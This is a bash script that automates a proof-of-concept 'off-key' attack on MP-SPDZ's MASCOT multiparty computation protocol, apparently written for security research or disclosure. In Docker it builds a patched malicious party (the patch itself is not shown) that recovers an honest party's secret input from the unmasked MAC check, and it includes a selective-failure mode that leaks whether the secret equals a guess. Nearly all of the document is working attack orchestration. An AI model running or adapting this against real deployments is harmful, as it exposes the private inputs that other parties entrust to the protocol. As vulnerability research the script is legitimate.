#!/bin/bash
# Off-key attack against MP-SPDZ MASCOT on Example 2: private affine evaluation
#   f(x; (y, r)) = x*y + r,   output only to P0,   r uniform (P1's input).
#
# Unlike Example 1 (multiplication with a zero input), here the output is masked
# by the uniform r for ANY x, so it reveals nothing about y even to P0. In the
# ideal world the attacker learns nothing about y. Yet the off-key attack lets a
# malicious P0 read y off MP-SPDZ's (unmasked) MAC check.
#
# Two variants (this script runs RECOVERY by default):
#   * RECOVERY: no guess. The worker opens d = y - b under key
#     alpha+1 while y is authenticated under alpha, so the reconstructed check
#     value on that opening is exactly y. Attacker recovers y in one run.
#   * SELECTIVE FAILURE: set GUESS=1 and x=1. The protocol aborts
#     iff y != 1, so the abort reveals whether y = 1. Run:
#         GUESS=1 ./run-affine.sh 1 1     # y=1 -> succeeds ; other y -> aborts
#
# The honest party (P1) runs a completely unmodified MP-SPDZ binary.
#
# Usage: ./run-affine.sh [secret_y] [x]     (defaults: y=42, x=1)

set -eo pipefail

SECRET=${1:-42}          # P1's secret y
X=${2:-1}                # P0's (attacker's) x
GUESS=${GUESS:-0}        # 0 = recovery mode; 1 = selective-failure test of y==1
# r must be uniform over the WHOLE field for x*y+r to hide y for every x: a
# small-range r would leave the possible outputs disjoint across y for a large x,
# and the opened output would itself identify y. Sample 256 uniform bits; the
# in-protocol reduction modulo the (128-bit) MASCOT field prime makes this a
# uniform field element (statistical distance <= 2^-128 from uniform over F_p).
R=$(python3 -c 'import secrets; print(secrets.randbits(256))')   # P1's uniform field mask r (hidden from P0)
S=$(python3 -c 'import secrets; print(secrets.randbits(256))')   # P0's one-sided-output mask s

echo "=== Off-Key Attack on Example 2: private affine eval  f(x;(y,r)) = x*y+r ==="
echo "P1 secret y = $SECRET ,  P0 input x = $X ,  P1 field mask r (uniform, hidden from P0)"
echo "P0's legitimate output x*y+r is a uniform field element -- reveals nothing about y for ANY x."
if [ "$GUESS" = "0" ]; then
  echo "Mode: RECOVERY -- attacker reads y from the MAC check."
else
  echo "Mode: SELECTIVE FAILURE -- abort reveals whether y == $GUESS."
fi
echo ""

cd "$(dirname "$0")"

NETWORK=affine-net
PORT=16000

cleanup() {
  docker rm -f attacker honest 2>/dev/null || true
  docker network rm $NETWORK 2>/dev/null || true
}
trap cleanup EXIT
cleanup

docker network create $NETWORK >/dev/null

echo "--- Step 1: Start containers (same clean base image) ---"
docker run -d --name attacker --network $NETWORK mpspdz:built sleep infinity >/dev/null
docker run -d --name honest   --network $NETWORK mpspdz:built sleep infinity >/dev/null

echo "--- Step 2: Prepare honest party P1 (completely unmodified) ---"
docker cp affine_eval.mpc honest:/usr/src/MP-SPDZ/Programs/Source/
docker exec honest bash -c "
  cd /usr/src/MP-SPDZ
  ./compile.py affine_eval 2>&1 | tail -1
  mkdir -p Player-Data
  # Input files are per THREAD: -0 = main thread, -1 = worker thread.
  echo $SECRET > Player-Data/Input-P1-0     # main:   y
  echo $R      > Player-Data/Input-P1-1     # worker: r
"
echo "  honest ready (stock mascot-party.x, no patches)"

echo "--- Step 3: Prepare attacker P0 (patched binary) ---"
docker cp affine_eval.mpc attacker:/usr/src/MP-SPDZ/Programs/Source/
docker cp patch_guess.py attacker:/usr/src/MP-SPDZ/
docker exec attacker bash -c "
  cd /usr/src/MP-SPDZ
  python3 patch_guess.py
  rm -f Machines/SPDZ.o Machines/mascot-party.o Protocols/*.o
  make -j4 mascot-party.x 2>&1 | tail -1
  ./compile.py affine_eval 2>&1 | tail -1
  mkdir -p Player-Data
  # P0 has no main-thread input; on the worker thread it supplies x then the
  # one-sided-output mask s (the 'mask known only to P0').
  : > Player-Data/Input-P0-0
  printf '%s\n%s\n' $X $S > Player-Data/Input-P0-1
"
echo "  attacker ready (patched mascot-party.x)"

echo ""
echo "--- Step 4: Run protocol once ---"
docker exec -d attacker bash -c "
  cd /usr/src/MP-SPDZ
  ATTACK_MAC_KEY=1 ATTACK_GUESS=$GUESS \
    ./mascot-party.x 0 affine_eval -pn $PORT -h attacker -N 2 \
    > /tmp/party0.log 2>&1
"
sleep 1
docker exec honest bash -c "
  cd /usr/src/MP-SPDZ
  ./mascot-party.x 1 affine_eval -pn $PORT -h attacker -N 2 \
    > /tmp/party1.log 2>&1
" || true
sleep 2

echo "--- Attacker log ---"
docker exec attacker cat /tmp/party0.log 2>/dev/null | sed 's/^/  [attacker] /'
echo ""

echo "=== RESULT ==="
if [ "$GUESS" = "0" ]; then
  # Recovery: exactly one opened value on the worker is nonzero -- it is y.
  ALL=$(docker exec attacker cat /tmp/party0.log 2>/dev/null \
          | sed -n 's/.*ATTACK_RECOVERED opening=[0-9]* value=\([0-9]*\).*/\1/p')
  FOUND=$(printf '%s\n' "$ALL" | grep -v '^0$' | tail -1 || true)
  REC=${FOUND:-0}
  echo "Attacker recovered the honest party's secret: y = $REC"
  [ "$REC" = "$SECRET" ] && echo "(matches the true secret $SECRET)" \
                         || echo "(true secret was $SECRET -- inspect log above)"
else
  if docker exec attacker grep -q "DONE" /tmp/party0.log 2>/dev/null; then
    echo "Program succeeded  =>  attacker learns  y == $GUESS"
  else
    echo "MAC check failure  =>  attacker learns  y != $GUESS"
  fi
fi
echo ""
echo "Either way, P0's legitimate output x*y+r is uniform and reveals nothing"
echo "about y: this is a genuine violation of malicious security, not just a"
echo "leak that an ideal-world adversary could also cause (cf. Example 1)."
